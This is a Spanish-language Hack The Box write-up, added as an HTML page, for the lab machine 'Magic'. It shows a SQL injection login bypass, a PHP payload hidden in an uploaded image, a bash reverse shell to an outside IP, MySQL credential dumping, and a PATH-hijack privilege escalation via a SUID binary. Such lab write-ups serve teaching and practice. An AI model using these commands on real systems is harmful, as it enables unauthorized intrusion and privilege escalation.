@@ -1,0 +1,149 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Magic HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/magic/pasted-20260413120257.png" alt="Magic HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Magic</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>path_hijacking</span>
+            <span>mysql</span>
+            <span>mysql_dump</span>
+            <span>mysql_show</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Web con login y subida de imágenes</li>
+            <li><code>Explotación</code>: Bypass de login por SQLI y subida de imagen con PHP embebido</li>
+            <li><code>Movimiento lateral</code>: Credenciales MySQL extraídas con herramientas locales y reutilizadas</li>
+            <li><code>Escalada de Privilegios</code>: Path hijacking sobre binario SUID que invoca utilidades de forma relativa</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413121153.png" alt="Magic HTB" />
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413125037.png" alt="Magic HTB" />
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413121133.png" alt="Magic HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: SQLI Bypass Login</h2>
+          <div class="code-card">
+            <h3>Bypass Panel Login</h3>
+            <pre><code># Username: admin' or 1=1-- -
+# Password: admin' or 1=1-- -</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413121251.png" alt="Magic HTB" />
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413121302.png" alt="Magic HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Upload RCE Image</h2>
+          <div class="code-card">
+            <h3>Inspeccionando vemos donde se almacenan las imágenes</h3>
+            <pre><code># Inspeccionar imágenes del index.php</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413123538.png" alt="Magic HTB" />
+          <div class="code-card">
+            <h3>RCE</h3>
+            <pre><code># Descargar imagen de Internet
+# Agregar com exiftool o directamente con nano el payload php
+# Cambiar nombre de la imagen y subirla directamente a la web
+
+# RCE: http://10.129.1.80/images/uploads/hacker.php.jpeg?cmd=whoami</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413125151.png" alt="Magic HTB" />
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413125340.png" alt="Magic HTB" />
+          <div class="code-card">
+            <h3>Reverse shell</h3>
+            <pre><code># RCE: http://10.129.1.80/images/uploads/hacker.php.jpeg?cmd=bash -c "bash -i &gt;%26 /dev/tcp/10.10.16.178/443 0&gt;%261"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413125803.png" alt="Magic HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: BD</h2>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413130653.png" alt="Magic HTB" />
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413130701.png" alt="Magic HTB" />
+          <div class="code-card">
+            <h3>Conexión BD mysqlshow</h3>
+            <pre><code># MySQL no está instalado MySQL + Tabular
+mysqlshow -u theseus -piamkingtheseus
+# BD: Magic
+# User: theseus
+# Pass: iamkingtheseus</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413132820.png" alt="Magic HTB" />
+          <div class="code-card">
+            <h3>Enumerar BD</h3>
+            <pre><code># BD: Magic
+mysqlshow -u theseus -piamkingtheseus Magic
+# Tabla: Login
+mysqlshow -u theseus -piamkingtheseus Magic login
+# Atributos username y password -&gt; mysqlshow no lista atributos
+mysqldump -utheseus -piamkingtheseus Magic login
+
+# Credenciales -&gt; theseus:Th3s3usW4sK1ng</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413132915.png" alt="Magic HTB" />
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413132937.png" alt="Magic HTB" />
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413133320.png" alt="Magic HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413135159.png" alt="Magic HTB" />
+          <div class="code-card">
+            <h3>Ejecutar Binario</h3>
+            <pre><code>/bin/sysinfo # Parece ejecutar comandos del sistema que enumera info del Hardware
+strings /bin/sysinfo # Leer Binario
+
+# Ejecuta comandos usando rutas relativas como lshw, fdisk...</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413135856.png" alt="Magic HTB" />
+          <div class="code-card">
+            <h3>fdisk</h3>
+            <pre><code>#!/bin/bash
+chmod u+s /bin/bash</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Path Hijacking</h3>
+            <pre><code>cd /tmp
+# Crear fdisk con el payload SUID a Bash en /tmp
+chmod +x fdisk
+export PATH=/tmp:$PATH
+# Ejecutar payload
+/bin/sysinfo
+bash -p</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/magic/pasted-20260413140638.png" alt="Magic HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>path_hijacking</span>
+            <span>mysql</span>
+            <span>mysql_dump</span>
+            <span>mysql_show</span>
+            <span>imagen</span>
+            <span>bypass_login</span>
+            <span>SUID</span>
+            <span>exiftool</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
